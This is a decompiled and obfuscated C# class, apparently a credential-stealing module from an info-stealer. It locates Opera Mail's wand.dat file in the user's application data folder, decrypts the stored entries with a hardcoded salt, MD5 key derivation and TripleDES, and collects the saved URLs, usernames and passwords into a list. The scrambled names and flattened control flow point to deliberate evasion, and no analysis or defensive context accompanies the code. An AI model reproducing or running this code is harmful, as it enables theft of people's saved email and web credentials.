using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class FdHU4eb83Z7 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string b2epV
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public FdHU4eb83Z7()
	{
		b2epV = "Opera Mail";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string text = default;
		List<ii68> list = default;
		string text2 = default;
		while (true)
		{
			if (num == 5)
			{
				text += "\\Opera Mail\\Opera Mail\\wand.dat";
				num = 6;
			}
			if (num == 2)
			{
				list = new List<ii68>();
				num = 3;
			}
			if (num == 4)
			{
				if (!File.Exists(text + "\\Opera Mail\\Opera Mail\\wand.dat"))
				{
					goto IL_00e7;
				}
				num = 5;
			}
			if (num == 6)
			{
				break;
			}
			if (num == 3)
			{
				text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				num = 4;
			}
			if (num != 7)
			{
				if (num == 1)
				{
					text2 = "";
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 8)
				{
					break;
				}
				continue;
			}
			goto IL_00e7;
			IL_00e7:
			return new List<ii68>();
		}
		try
		{
			byte[] array = File.ReadAllBytes(text);
			int num2 = 0;
			for (int i = 0; i <= array.Length - 5; i++)
			{
				if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
				{
					num2 = Convert.ToInt32(array[i + 15]);
					byte[] array2 = new byte[8];
					byte[] array3 = new byte[num2 - 1 + 1];
					Array.Copy(array, i + 4, array2, 0, array2.Length);
					Array.Copy(array, i + 16, array3, 0, array3.Length);
					text2 = text2 + WxThBr(array2, array3) + Environment.NewLine;
					i += 11 + num2;
				}
			}
			text2 = EEeWFlFzBre(text2);
			string[] array4 = text2.gy6HND7Xm(Environment.NewLine);
			for (int j = 4; j <= array4.Length - 3; j += 3)
			{
				list.Add(new ii68
				{
					byIdLuuGZbL = array4[j].Replace("opera:", ""),
					S8v = array4[j + 1],
					_9H5rP7hg2 = array4[j + 2],
					oVAe = b2epV
				});
			}
		}
		catch
		{
		}
		return list;
	}

	private static string EEeWFlFzBre(string Pp7x)
	{
		int num = 0;
		string text = default;
		char c = default;
		string text2 = default;
		int num2 = default;
		string text3 = default;
		do
		{
			if (num == 9)
			{
				goto IL_001f;
			}
			goto IL_0036;
			IL_0036:
			if (num == 1)
			{
				text = "abcçdefgğhıijklmnoöpqrsştuüvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=" + Environment.NewLine + " ";
				num = 2;
			}
			if (num == 7)
			{
				if (!text.Contains(c.ToString().ToLower()))
				{
					goto IL_001f;
				}
				num = 8;
			}
			if (num == 2)
			{
				text2 = "";
				num = 3;
			}
			if (num == 6)
			{
				goto IL_00d2;
			}
			goto IL_00ec;
			IL_001f:
			num2++;
			num = 10;
			goto IL_0036;
			IL_00ec:
			if (num == 4)
			{
				num2 = 0;
				num = 5;
			}
			if (num == 5 || num == 10)
			{
				if (num2 < text3.Length)
				{
					goto IL_00d2;
				}
				num = 11;
			}
			if (num == 3)
			{
				text3 = Pp7x;
				num = 4;
			}
			if (num == 8)
			{
				text2 += c;
				num = 9;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_00d2:
			c = text3[num2];
			num = 7;
			goto IL_00ec;
		}
		while (num != 11);
		return text2;
	}

	private static string WxThBr(byte[] Tq2xlWkC5a0, byte[] KH3Ud8BBL)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			byte[] array = new byte[11]
			{
				131, 125, 15, 15, 142, 179, 232, 105, 115, 175,
				255
			};
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			mD5CryptoServiceProvider.Initialize();
			byte[] array2 = new byte[array.Length + Tq2xlWkC5a0.Length];
			Array.Copy(array, array2, array.Length);
			Array.Copy(Tq2xlWkC5a0, 0, array2, array.Length, Tq2xlWkC5a0.Length);
			byte[] array3 = mD5CryptoServiceProvider.ComputeHash(array2);
			array2 = new byte[array3.Length + array.Length + Tq2xlWkC5a0.Length];
			Array.Copy(array3, array2, array3.Length);
			Array.Copy(array, 0, array2, array3.Length, array.Length);
			Array.Copy(Tq2xlWkC5a0, 0, array2, array3.Length + array.Length, Tq2xlWkC5a0.Length);
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array2);
			byte[] array4 = new byte[24];
			byte[] array5 = new byte[8];
			Array.Copy(array3, array4, array3.Length);
			Array.Copy(sourceArray, 0, array4, array3.Length, 8);
			Array.Copy(sourceArray, 8, array5, 0, 8);
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
			tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
			tripleDESCryptoServiceProvider.Key = array4;
			tripleDESCryptoServiceProvider.IV = array5;
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider2 = tripleDESCryptoServiceProvider;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider2.CreateDecryptor();
			byte[] bytes = cryptoTransform.TransformFinalBlock(KH3Ud8BBL, 0, KH3Ud8BBL.Length);
			return Encoding.Unicode.GetString(bytes);
		}
		catch
		{
			return "";
		}
	}
}
